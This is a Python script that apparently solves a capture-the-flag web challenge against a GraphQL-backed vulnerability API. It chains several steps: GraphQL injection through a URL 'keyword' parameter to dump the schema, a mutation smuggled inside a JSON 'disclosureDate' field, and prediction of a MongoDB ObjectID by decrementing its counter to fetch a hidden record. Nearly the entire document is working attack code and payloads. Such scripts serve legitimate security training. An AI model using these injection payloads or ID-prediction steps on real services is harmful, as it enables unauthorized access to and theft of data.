import requests
import json
from bson.objectid import ObjectId


TARGET = "https://secure-api.ctf.ingeniums.club"

def extract_schema():
    keyword = 'dontgivemevulns"){cve}asdf:__schema{ctypes:types{cname:name,cfields:fields{c:name,ctype:type{ctypename:name,ckind:kind,cofType:ofType{cotname:name,cotkind:kind}},cargs:args{caname:name,catype:type{caname:name,cakind:kind}}}}}}%23'
    url = f"{TARGET}/vulns?keyword={keyword}"
    response = requests.get(url)
    return response.json()

# Step 2: insert comment and flag in  same second
def insert_comment():
    url = f"{TARGET}/vulns"
    headers = {"Content-Type": "application/json"}
    payload = {
        "cve": "hello",
        "severity": "Low",
        "affectedSoftware": ["PostgreSQL 14", "Linux Kernel 5.15", "Firefox 115"],
        "exploitabilityScore": 2,
        "patchAvailable": True,
        "disclosureDate": 'asdf") insertFlagAsComment createComment(content:"givme flag"){id}}#'
    }
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    data = response.json()
    if "createComment" in data:
        return data["createComment"]["id"]
    return None

# Step 3:  (we only need to decrement the counter part by one bcz the two comments was inserted in the same second)
def generate_possible_ids(known_id):
    known_oid = ObjectId(known_id)
    base_id = str(known_oid)[:-6]
    current_counter = int(known_id[-6:], 16)
    possible_ids = [f"{base_id}{current_counter - 1:06x}"]
    print("[+] Generated possible ObjectID:", possible_ids[0])
    return possible_ids

# Step 4: query for the flag
def find_flag(known_id):
    possible_ids = generate_possible_ids(known_id)
    for oid in possible_ids:
        print("[+] Trying ObjectID:", oid)
        url = f"{TARGET}/vulns?keyword=sadf{{cve}}\"){{cve}}+f:getCommentById(id:\"{oid}\"){{id+content}}}}%23"

        response = requests.get(url)
        print("[+] Response:", response.text)
        if "content" in response.text:
            print("\n[+] Flag Found! Response:", response.json())
            return response.json()
    return None

if __name__ == "__main__":
    print("[+] Extracting schema...")
    schema = extract_schema()
    print("Schema Extracted!", schema)
    
    print("[+] Injecting comment and flag...")
    comment_id = insert_comment()
    if not comment_id:
        print("[-] Failed to inject comment!")
        exit()
    print("[+] Injected! Comment ID:", comment_id)
    
    print("[+] Brute-forcing ObjectIDs...")
    flag = find_flag(comment_id)
    if not flag:
        print("[-] Flag not found!")
    else:
        print("[+] FLAG:", flag["f"]["content"])